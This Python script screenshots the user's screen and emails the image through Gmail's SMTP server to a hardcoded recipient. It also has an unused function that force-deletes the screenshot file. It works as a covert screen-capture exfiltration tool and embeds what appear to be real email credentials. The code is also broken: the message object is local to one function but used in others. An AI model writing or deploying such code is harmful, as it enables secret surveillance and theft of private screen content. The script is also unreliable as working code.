import smtplib
import PIL.ImageGrab as a
import os
from email.mime.text import MIMEText #glue
from email.mime.multipart import MIMEMultipart #blocks
from email.mime.base import MIMEBase
from email import encoders
import getpass

#for changing directory
def changedir():
	b2=getpass.getuser()
	b1='c:\\Users\\'
	b3='\\Desktop\\'
	b=b1+b2+b3
	os.chdir(b)

#variables
senderMail='justin.fuller15537@gmail.com'
recieverMail='chitranjan15537@gmail.com'
body='Hello world!'
subject='test'

#for components
def components():
	msg=MIMEMultipart()
	msg['From']=senderMail
	msg['To']=recieverMail
	msg['Subject']=subject
	msg.attach(MIMEText(body,'plain'))


#for screenshot
def screenshot():
	obj=a.grab()
	obj.save("Screenshot.png","png")

#for attachment
def attachment():
	filename='Screenshot.png'
	attachment=open(filename,"rb")
	part=MIMEBase('application','octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('content-disposition',"attachment; filename= "+filename)
	msg.attach(part)

#mail server
def mail():
	text=msg.as_string()
	server=smtplib.SMTP('smtp.gmail.com',587) 
	server.starttls()
	server.login(senderMail,'storm_thunder')
	server.ehlo()
	server.sendmail(senderMail,recieverMail,text)
	server.quit()

def delete():	
	os.system('del /f Screenshot.png')

#mainprogram
changedir()
components()
screenshot()
attachment()
mail()